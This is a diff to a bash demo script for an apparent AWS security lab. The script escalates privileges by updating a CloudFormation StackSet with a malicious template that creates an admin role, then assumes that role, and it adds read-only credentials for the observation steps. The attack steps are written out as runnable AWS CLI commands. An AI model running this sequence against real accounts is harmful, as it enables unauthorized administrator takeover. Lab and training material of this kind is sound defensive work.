@@ -72,6 +72,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region and resource suffix (needed later)
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 RESOURCE_SUFFIX=$(terraform output -raw resource_suffix 2>/dev/null || echo "")
@@ -88,6 +97,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo "Resource Suffix: $RESOURCE_SUFFIX"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
@@ -95,12 +105,22 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -115,15 +135,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -133,12 +155,13 @@ else
 fi
 echo ""
 
-# Step 5: Describe the existing CloudFormation StackSet
+# [OBSERVATION] Step 5: Describe the existing CloudFormation StackSet
 echo -e "${YELLOW}Step 5: Inspecting the existing CloudFormation StackSet${NC}"
+use_readonly_creds
 echo "StackSet name: $STACKSET_NAME"
 echo ""
 echo "StackSet details:"
-show_cmd "Attacker" "aws cloudformation describe-stack-set --region $AWS_REGION --stack-set-name $STACKSET_NAME --query 'StackSet.[StackSetName,Status,Description]' --output table"
+show_cmd "ReadOnly" "aws cloudformation describe-stack-set --region $AWS_REGION --stack-set-name $STACKSET_NAME --query 'StackSet.[StackSetName,Status,Description]' --output table"
 aws cloudformation describe-stack-set \
     --region $AWS_REGION \
     --stack-set-name $STACKSET_NAME \
@@ -147,7 +170,7 @@ aws cloudformation describe-stack-set \
 
 echo ""
 echo "Current StackSet template (benign - just creates an S3 bucket):"
-show_cmd "Attacker" "aws cloudformation describe-stack-set --region $AWS_REGION --stack-set-name $STACKSET_NAME --query 'StackSet.TemplateBody' --output text"
+show_cmd "ReadOnly" "aws cloudformation describe-stack-set --region $AWS_REGION --stack-set-name $STACKSET_NAME --query 'StackSet.TemplateBody' --output text"
 aws cloudformation describe-stack-set \
     --region $AWS_REGION \
     --stack-set-name $STACKSET_NAME \
@@ -259,8 +282,9 @@ echo "  - EscalatedAdminRole: IAM role with AdministratorAccess"
 echo "  - Trust policy allows: $STARTING_USER to assume the role"
 echo -e "${GREEN}✓ Malicious template created${NC}\n"
 
-# Step 7: Update the CloudFormation StackSet
+# [EXPLOIT] Step 7: Update the CloudFormation StackSet
 echo -e "${YELLOW}Step 7: Updating CloudFormation StackSet with malicious template${NC}"
+use_starting_creds
 echo "Using cloudformation:UpdateStackSet permission..."
 echo "StackSet will use its admin execution role to create the escalated role"
 echo ""
@@ -285,13 +309,14 @@ OPERATION_ID=$(aws cloudformation update-stack-set \
 echo "StackSet update operation ID: $OPERATION_ID"
 echo -e "${GREEN}✓ StackSet update initiated${NC}\n"
 
-# Wait for UpdateStackSet to complete before calling UpdateStackInstances
+# [OBSERVATION] Wait for UpdateStackSet to complete
 echo -e "${YELLOW}Waiting for StackSet update to complete...${NC}"
+use_readonly_creds
 echo "This may take a moment..."
 echo ""
 
 while true; do
-    show_cmd "Attacker" "aws cloudformation describe-stack-set-operation --region $AWS_REGION --stack-set-name $STACKSET_NAME --operation-id $OPERATION_ID --query 'StackSetOperation.Status' --output text"
+    show_cmd "ReadOnly" "aws cloudformation describe-stack-set-operation --region $AWS_REGION --stack-set-name $STACKSET_NAME --operation-id $OPERATION_ID --query 'StackSetOperation.Status' --output text"
     STACKSET_STATUS=$(aws cloudformation describe-stack-set-operation \
         --region $AWS_REGION \
         --stack-set-name $STACKSET_NAME \
@@ -317,12 +342,13 @@ echo -e "${YELLOW}Waiting 15 seconds for IAM role to propagate...${NC}"
 sleep 15
 echo -e "${GREEN}✓ IAM role propagated${NC}\n"
 
-# Step 8: Verify the escalated role was created
+# [OBSERVATION] Step 8: Verify the escalated role was created
 echo -e "${YELLOW}Step 8: Verifying escalated role was created${NC}"
+use_readonly_creds
 ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$ESCALATED_ROLE_NAME"
 echo "Role ARN: $ROLE_ARN"
 
-show_cmd "Attacker" "aws iam get-role --role-name $ESCALATED_ROLE_NAME"
+show_cmd "ReadOnly" "aws iam get-role --role-name $ESCALATED_ROLE_NAME"
 if aws iam get-role --role-name $ESCALATED_ROLE_NAME &> /dev/null; then
     echo -e "${GREEN}✓ Escalated role exists${NC}"
 else
@@ -331,12 +357,13 @@ else
 fi
 echo ""
 
-# Step 9: Assume the escalated admin role
+# [EXPLOIT] Step 9: Assume the escalated admin role
 echo -e "${YELLOW}Step 9: Assuming the escalated admin role${NC}"
+use_starting_creds
 echo "Using sts:AssumeRole to get admin credentials..."
 echo ""
 
-show_cmd "Attacker" "aws sts assume-role --role-arn $ROLE_ARN --role-session-name escalation-demo-session --query 'Credentials' --output json"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $ROLE_ARN --role-session-name escalation-demo-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $ROLE_ARN \
     --role-session-name escalation-demo-session \
@@ -360,7 +387,7 @@ if [[ ! $ROLE_IDENTITY == *"$ESCALATED_ROLE_NAME"* ]]; then
 fi
 echo -e "${GREEN}✓ Successfully assumed escalated admin role${NC}\n"
 
-# Step 10: Verify administrator access
+# [OBSERVATION] Step 10: Verify administrator access (using escalated role session)
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
